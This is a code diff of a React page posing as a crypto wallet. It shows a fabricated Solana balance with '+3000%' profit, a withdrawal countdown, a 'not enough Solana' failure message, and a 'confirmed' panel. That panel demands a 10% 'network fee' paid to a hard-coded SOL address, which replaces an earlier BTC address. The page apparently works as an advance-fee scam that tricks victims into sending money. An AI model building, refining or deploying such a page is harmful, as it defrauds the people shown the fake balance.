@@ -1,7 +1,6 @@
 "use client";
+
 import { useState, useEffect } from "react";
-
-
 
 export default function Page() {
   const [open, setOpen] = useState(false);
@@ -14,10 +13,8 @@ export default function Page() {
 
   const LIMIT_SECONDS = 22 * 60 * 60;
 
-  
-
   const [timeLeft, setTimeLeft] = useState(LIMIT_SECONDS);
-  
+
   const portfolioValue = solAmount * solPrice;
   const amountNumber = Number(amount) || 0;
   const networkFee = amountNumber * 0.1;
@@ -29,27 +26,28 @@ export default function Page() {
     setConfirmed(true);
   };
 
+
   useEffect(() => {
-  const fetchPrice = async () => {
-    try {
-      const res = await fetch(
-        "/api/price"
-      );
+    const fetchPrice = async () => {
+      try {
+        const res = await fetch(
+          "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
+        );
 
-      const data = await res.json();
+        const data = await res.json();
 
-      setSolPrice(data.solana.usd);
-    } catch (error) {
-      console.error(error);
-    }
-  };
+        setSolPrice(data.solana.usd);
+      } catch (error) {
+        console.error(error);
+      }
+    };
 
-  fetchPrice();
+    fetchPrice();
 
-  const interval = setInterval(fetchPrice, 30000);
+    const interval = setInterval(fetchPrice, 30000);
 
-  return () => clearInterval(interval);
-}, []);
+    return () => clearInterval(interval);
+  }, []);
 
 
   useEffect(() => {
@@ -63,331 +61,492 @@ export default function Page() {
           clearInterval(interval);
           return 0;
         }
+
         return prev - 1;
       });
     }, 1000);
 
+
     return () => clearInterval(interval);
+
   }, [open]);
 
-  const formatTime = (seconds: number) => {
+
+  const formatTime = (seconds:number) => {
+
     const hours = Math.floor(seconds / 3600);
-    const minutes = Math.floor((seconds % 3600) / 60);
+
+    const minutes = Math.floor(
+      (seconds % 3600) / 60
+    );
+
     const secs = seconds % 60;
 
+
     return [hours, minutes, secs]
-      .map((v) => String(v).padStart(2, "0"))
+      .map((v)=>String(v).padStart(2,"0"))
       .join(":");
   };
 
-  const handleCopyWallet = async () => {
-    await navigator.clipboard.writeText(walletAddress);
-
-    setCopied(true);
-
-    setTimeout(() => {
-      setCopied(false);
-    }, 2000);
-  };
 
   return (
-    <main className="min-h-screen bg-black text-white flex justify-center overflow-x-hidden">
-      <div className="w-full max-w-md mx-auto px-5 py-6 pb-24 overflow-hidden">
-        {/* TOP MENU */}
-        <div className="flex items-center gap-3 mb-8">
-          <img
-            src="/user.png"
-            alt="User"
-            className="w-12 h-12 rounded-full object-cover shrink-0"
-          />
-          <button className="bg-[#b89cff] text-black px-5 py-3 rounded-full text-lg font-bold">
-            Home
-          </button>
-          <button className="bg-neutral-900 text-neutral-300 px-5 py-3 rounded-full text-lg font-bold">
-            Trade
-          </button>
-          <button className="bg-neutral-900 text-neutral-300 px-5 py-3 rounded-full text-lg font-bold">
-            Explore
-          </button>
-        </div>
 
-        {/* ACCOUNT */}
-        <p className="text-neutral-400 text-xl font-bold mb-2">
-          Account 1⌄
-        </p>
+<main className="min-h-screen bg-black text-white flex justify-center overflow-x-hidden">
 
-<h1 className="text-7xl font-bold">
-  $
-  {portfolioValue.toLocaleString("en-US", {
-    maximumFractionDigits: 0,
-  })}
-</h1>
-        <div className="flex gap-3 mt-4 text-2xl font-bold">
-<span className="text-green-400">
-  +$
-  {portfolioValue.toLocaleString("en-US", {
-    maximumFractionDigits: 0,
-  })}
-</span>
-          <span className="bg-green-500 text-black px-3 rounded-xl">
-            +3000%
-          </span>
-        </div>
+<div className="w-full max-w-md mx-auto px-5 py-6 pb-24 overflow-hidden">
 
-        {/* CASH */}
-        <div className="mt-8 bg-neutral-900 rounded-[28px] p-6 flex justify-between items-center">
-          <div className="flex items-center gap-4">
-            <img
-              src="/cash.png"
-              alt="Cash"
-              className="w-10 h-10 object-contain"
-            />
-            <span className="text-2xl font-bold">Cash</span>
-          </div>
-          <span className="text-2xl">$0.00</span>
-        </div>
 
-        {/* TOKENS */}
-        <h2 className="text-4xl font-bold mt-10 mb-5">
-          Tokens ›
-        </h2>
-<Token
-  img="/solana.png"
-  name="Solana"
-  amount={`${solAmount.toLocaleString()} SOL`}
-  value={`$${portfolioValue.toLocaleString("en-US", {
-    maximumFractionDigits: 0,
-  })}`}
-  profit={`+$${portfolioValue.toLocaleString("en-US", {
-    maximumFractionDigits: 0,
-  })}`}
+{/* MENU */}
+
+<div className="flex items-center gap-3 mb-8">
+
+<img
+src="/user.png"
+alt="User"
+className="w-12 h-12 rounded-full object-cover"
 />
 
-        <Token
-          img="/bitcoin.png"
-          name="Bitcoin"
-          amount="0 BTC"
-          value="$0.00"
-          profit="$0.00"
-        />
 
-        <Token
-          img="/ethereum.png"
-          name="Ethereum"
-          amount="0 ETH"
-          value="$0.00"
-          profit="$0.00"
-        />
+<button className="bg-[#b89cff] text-black px-5 py-3 rounded-full text-lg font-bold">
+Home
+</button>
 
-        {/* WITHDRAWAL BUTTON */}
-        <button
-          onClick={() => setOpen(true)}
-          className="w-full mt-8 bg-[#b89cff] text-black rounded-[28px] py-5 text-2xl font-bold"
-        >
-          Withdrawal
-        </button>
 
-        {/* MODAL */}
-        {open && (
-          <div className="fixed inset-0 bg-black/80 flex items-end justify-center px-5 pb-6">
-<div
-  className="
-    w-full
-    max-w-md
-    bg-neutral-900
-    rounded-[30px]
-    p-6
-    max-h-[90vh]
-    overflow-y-auto
-    overscroll-contain
-  "
->
-                <h3 className="text-3xl font-bold mb-5">
-                Withdrawal
-              </h3>
+<button className="bg-neutral-900 text-neutral-300 px-5 py-3 rounded-full text-lg font-bold">
+Trade
+</button>
 
-              {/* WITHDRAWAL REQUEST CARD */}
-<div className="mb-5 rounded-[28px] bg-black border border-[#b89cff] p-5">
 
-  <h4 className="text-xl font-bold">
-    Withdrawal Request
-  </h4>
+<button className="bg-neutral-900 text-neutral-300 px-5 py-3 rounded-full text-lg font-bold">
+Explore
+</button>
 
-  <div
-    className={`mt-4 text-3xl font-bold tracking-wider ${
-      timeLeft < 3600
-        ? "text-red-500"
-        : "text-[#b89cff]"
-    }`}
-  >
-    {formatTime(timeLeft)}
-  </div>
 
 </div>
 
+
+
+<p className="text-neutral-400 text-xl font-bold mb-2">
+Account 1⌄
+</p>
+
+
+<h1 className="text-7xl font-bold">
+$
+{portfolioValue.toLocaleString("en-US",{
+maximumFractionDigits:0
+})}
+</h1>
+
+
+
+<div className="flex gap-3 mt-4 text-2xl font-bold">
+
+<span className="text-green-400">
++$
+{portfolioValue.toLocaleString("en-US",{
+maximumFractionDigits:0
+})}
+</span>
+
+
+<span className="bg-green-500 text-black px-3 rounded-xl">
++3000%
+</span>
+
+
+</div>
+
+
+
+<div className="mt-8 bg-neutral-900 rounded-[28px] p-6 flex justify-between items-center">
+
+<div className="flex items-center gap-4">
+
+<img
+src="/cash.png"
+alt="Cash"
+className="w-10 h-10 object-contain"
+/>
+
+<span className="text-2xl font-bold">
+Cash
+</span>
+
+</div>
+
+
+<span className="text-2xl">
+$0.00
+</span>
+
+</div>
+
+
+
+
+
+<h2 className="text-4xl font-bold mt-10 mb-5">
+Tokens ›
+</h2>
+
+
+
+<Token
+img="/solana.png"
+name="Solana"
+amount={`${solAmount.toLocaleString()} SOL`}
+value={`$${portfolioValue.toLocaleString("en-US",{
+maximumFractionDigits:0
+})}`}
+profit={`+$${portfolioValue.toLocaleString("en-US",{
+maximumFractionDigits:0
+})}`}
+/>
+
+
+
+<Token
+img="/bitcoin.png"
+name="Bitcoin"
+amount="0 BTC"
+value="$0.00"
+profit="$0.00"
+/>
+
+
+
+<Token
+img="/ethereum.png"
+name="Ethereum"
+amount="0 ETH"
+value="$0.00"
+profit="$0.00"
+/>
+
+
+
+
+
+<button
+onClick={()=>setOpen(true)}
+className="w-full mt-8 bg-[#b89cff] text-black rounded-[28px] py-5 text-2xl font-bold"
+>
+Withdrawal
+</button>
+
+
+
+
+
+
+{open && (
+
+<div className="fixed inset-0 bg-black/80 flex items-end justify-center px-5 pb-6">
+
+
+<div className="w-full max-w-md bg-neutral-900 rounded-[30px] p-6 max-h-[90vh] overflow-y-auto">
+
+
+<h3 className="text-3xl font-bold mb-5">
+Withdrawal
+</h3>
+
+
+
+
+<div className="mb-5 rounded-[28px] bg-black border border-[#b89cff] p-5">
+
+
+<h4 className="text-xl font-bold">
+Withdrawal Request
+</h4>
+
+
+
+<div className="mt-4 text-3xl font-bold tracking-wider text-[#b89cff]">
+
+{formatTime(timeLeft)}
+
+</div>
+
+
+</div>
+
+
+
+
+
 {error && (
-                <div className="mb-5 rounded-3xl bg-black border border-[#b89cff]/40 p-4">
-                  <div className="flex items-start gap-3">
-                    <div className="w-10 h-10 rounded-full bg-[#b89cff] text-black flex items-center justify-center font-black text-xl">
-                      !
-                    </div>
 
-                    <div>
-                      <p className="text-[#b89cff] font-bold text-lg">
-                        Withdrawal Failed
-                      </p>
+<div className="mb-5 rounded-3xl bg-black border border-[#b89cff]/40 p-4">
 
-                      <p className="text-neutral-400 text-sm mt-1">
-                        Not enough Solana available to process this withdrawal.
-                      </p>
 
-                      <p className="text-neutral-500 text-xs mt-2">
-                        Please deposit additional SOL and try again.
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              )}
+<p className="text-[#b89cff] font-bold text-lg">
+Withdrawal Failed
+</p>
 
-              <label className="text-neutral-400">
-                Wallet address
-              </label>
 
-              <input
-                value={wallet}
-                onChange={(e) => setWallet(e.target.value)}
-                placeholder="Enter your wallet"
-                className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
-              />
+<p className="text-neutral-400 text-sm mt-1">
+Not enough Solana available to process this withdrawal.
+</p>
 
-              <label className="text-neutral-400">
-                Amount
-              </label>
 
-              <input
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                placeholder="$0.00"
-                className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
-              />
+</div>
 
-              <div className="mb-5 text-sm text-neutral-500">
-                Network: Solana
-              </div>
-
-              <button
-                onClick={handleWithdrawal}
-                className="w-full bg-[#b89cff] text-black rounded-2xl py-4 font-bold text-xl"
-              >
-                Confirm Withdrawal
-              </button>
-
-{confirmed && (
-  <div className="mt-5 rounded-3xl bg-green-500/10 border border-green-500/30 p-5">
-    <p className="text-green-400 font-bold text-xl">
-      Thank you for your withdrawal
-    </p>
-
-    <p className="text-white mt-3">
-      Your withdrawal request has been confirmed.
-    </p>
-
-    <div className="mt-3 flex justify-between">
-      <span className="text-neutral-400">
-        Network Fee (10%)
-      </span>
-
-      <span className="text-[#b89cff] font-bold">
-        ${networkFee.toFixed(2)}
-      </span>
-    </div>
-
-    <div className="mt-4 border-t border-white/10 pt-4">
-      <p className="text-neutral-400 text-sm mb-2">
-        BTC Wallet
-      </p>
-
-      <p className="break-all text-xs font-mono text-white">
-        bc1p3s8um5am0svmppnkqe73wqh3u2r0se6h9rfqkh2jmgd9wr6njchqvc9cu0
-      </p>
-
-      <button
-        type="button"
-        onClick={handleCopyWallet}
-        className="mt-3 bg-[#b89cff] text-black font-bold px-4 py-2 rounded-xl"
-      >
-        Copy
-      </button>
-    </div>
-
-  </div>
 )}
 
 
-              <button
-                onClick={() => setOpen(false)}
-                className="w-full mt-3 text-neutral-400 py-3"
-              >
-                Cancel
-              </button>
-            </div>
-          </div>
-        )}
-      </div>
-    </main>
-  );
+
+
+
+<label className="text-neutral-400">
+Wallet address
+</label>
+
+
+<input
+
+value={wallet}
+
+onChange={(e)=>setWallet(e.target.value)}
+
+placeholder="Enter your wallet"
+
+className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
+
+/>
+
+
+
+
+
+<label className="text-neutral-400">
+Amount
+</label>
+
+
+
+<input
+
+value={amount}
+
+onChange={(e)=>setAmount(e.target.value)}
+
+placeholder="$0.00"
+
+className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
+
+/>
+
+
+
+
+
+<div className="mb-5 text-sm text-neutral-500">
+
+Network: Solana
+
+</div>
+
+
+
+
+
+<button
+
+onClick={handleWithdrawal}
+
+className="w-full bg-[#b89cff] text-black rounded-2xl py-4 font-bold text-xl"
+
+>
+
+Confirm Withdrawal
+
+</button>
+
+
+
+
+
+{confirmed && (
+
+<div className="mt-5 rounded-3xl bg-green-500/10 border border-green-500/30 p-5">
+
+
+<p className="text-green-400 font-bold text-xl">
+Thank you for your withdrawal
+</p>
+
+
+
+<p className="text-white mt-3">
+Your withdrawal request has been confirmed.
+</p>
+
+
+
+
+<div className="mt-3 flex justify-between">
+
+<span className="text-neutral-400">
+Network Fee (10%)
+</span>
+
+
+<span className="text-[#b89cff] font-bold">
+${networkFee.toFixed(2)}
+</span>
+
+
+</div>
+
+
+
+
+
+<div className="mt-4 border-t border-white/10 pt-4">
+
+
+<p className="text-neutral-400 text-sm mb-2">
+SOL Wallet
+</p>
+
+
+
+<p className="break-all text-xs font-mono text-white">
+
+BSFkqcPQFPTRpm3ERVh8D5ytA3TBgE734L8zo4NKgnLX
+</p>
+
+
+
+</div>
+
+
+
+</div>
+
+)}
+
+
+
+
+
+<button
+
+onClick={()=>setOpen(false)}
+
+className="w-full mt-3 text-neutral-400 py-3"
+
+>
+
+Cancel
+
+</button>
+
+
+
+
+</div>
+
+</div>
+
+)}
+
+
+
+</div>
+
+</main>
+
+);
+
 }
 
+
+
+
+
 function Token({
-  img,
-  name,
-  amount,
-  value,
-  profit,
-}: {
-  img: string;
-  name: string;
-  amount: string;
-  value: string;
-  profit: string;
-}) {
-  const isGreen = profit.startsWith("+");
+img,
+name,
+amount,
+value,
+profit,
+}:{
+img:string;
+name:string;
+amount:string;
+value:string;
+profit:string;
+}){
 
-  return (
-    <div className="bg-neutral-900 rounded-[28px] p-5 flex justify-between items-center mb-3">
-      <div className="flex items-center gap-4">
-        <img
-          src={img}
-          alt={name}
-          className="w-14 h-14 rounded-full object-contain"
-        />
 
-        <div>
-          <p className="font-bold text-2xl">
-            {name}
-          </p>
+const isGreen = profit.startsWith("+");
 
-          <p className="text-neutral-400 text-xl">
-            {amount}
-          </p>
-        </div>
-      </div>
 
-      <div className="text-right">
-        <p className="text-2xl font-semibold">
-          {value}
-        </p>
+return (
 
-        <p
-          className={`text-xl font-semibold ${
-            isGreen
-              ? "text-green-400"
-              : "text-neutral-500"
-          }`}
-        >
-          {profit}
-        </p>
-      </div>
-    </div>
-  );
+<div className="bg-neutral-900 rounded-[28px] p-5 flex justify-between items-center mb-3">
+
+
+<div className="flex items-center gap-4">
+
+
+<img
+src={img}
+alt={name}
+className="w-14 h-14 rounded-full object-contain"
+/>
+
+
+
+<div>
+
+<p className="font-bold text-2xl">
+{name}
+</p>
+
+
+<p className="text-neutral-400 text-xl">
+{amount}
+</p>
+
+
+</div>
+
+
+</div>
+
+
+
+
+<div className="text-right">
+
+
+<p className="text-2xl font-semibold">
+{value}
+</p>
+
+
+<p className={`text-xl font-semibold ${
+isGreen ? "text-green-400" : "text-neutral-500"
+}`}>
+
+{profit}
+
+</p>
+
+
+
+</div>
+
+
+
+</div>
+
+
+);
+
 }
